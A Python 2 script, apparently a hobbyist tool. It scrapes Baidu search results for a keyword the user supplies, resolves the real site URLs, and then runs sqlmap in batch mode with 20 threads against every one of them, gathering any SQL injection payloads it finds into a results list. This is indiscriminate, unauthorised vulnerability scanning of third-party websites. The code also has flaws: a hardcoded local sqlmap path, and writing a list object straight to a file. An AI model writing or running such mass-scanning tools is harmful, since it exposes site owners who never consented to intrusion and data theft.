#coding=utf-8

import re
import requests
from pyquery import PyQuery as Pq
from threadpool import *
import test
import os

class BaiduSearchSpider(object):
    oriURL = []
    def __init__(self, searchText):
        self.url = "http://www.baidu.com/baidu?wd=%s" % searchText
        self.headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17"}
        self._page = None
    
    def page(self,url):
        if not self._page:
            r = requests.get(url, headers=self.headers)
            r.encoding = 'utf-8'
            self._page = Pq(r.text)
        return self._page
    
    def baiduURLs(self):
        li = []
        for i in range(10):
            url = self.url + '&pn=' + str(i*10)
            a= self.page(url)
            a = str(a)         
            li = li + re.findall('href="http:\S*"',a)
        print len(li)
        li = list(set(li))
        return li

    def ThreadRun(self,u):
        self.oriURL.append(requests.get(u).url)

    def originalURLs(self):
        tmpURLs = self.baiduURLs()
        for i in range(len(tmpURLs)):
            tmpURLs[i] = tmpURLs[i][6:-1]        
        a = tmpURLs
        a = list(set(a))
        pool = ThreadPool(5)  
        rrequests = makeRequests(self.ThreadRun,a)  
        [pool.putRequest(req) for req in rrequests]  
        pool.wait()  
        return self.oriURL


def sqltestRun(u):
    r = os.popen('C:\Users\Administrator\Desktop\sqltest\sqlmapproject-sqlmap-ab08273\sqlmap.py --batch -u '+ u )
    text = r.read()  
    if 'Parameter:' in text:
        result.append(u)
        print u
        result.append(text[text.find('Payload:'):text.find('---\n[')])
        print text[text.find('Payload:'):text.find('---\n[')]
        result.append('\n')
        print '\n'
    #f.close()
    r.close()

result = []    
searchText = raw_input("搜索内容是：") 
print searchText

bdsearch = BaiduSearchSpider(searchText)
originalurls = bdsearch.originalURLs()
print '=======Original URLs========'

pool = ThreadPool(20)  
rrequests = makeRequests(sqltestRun,originalurls)  
[pool.putRequest(req) for req in rrequests]  
pool.wait() 

f = open('result.txt','w')
f.write(result)
print '============================'
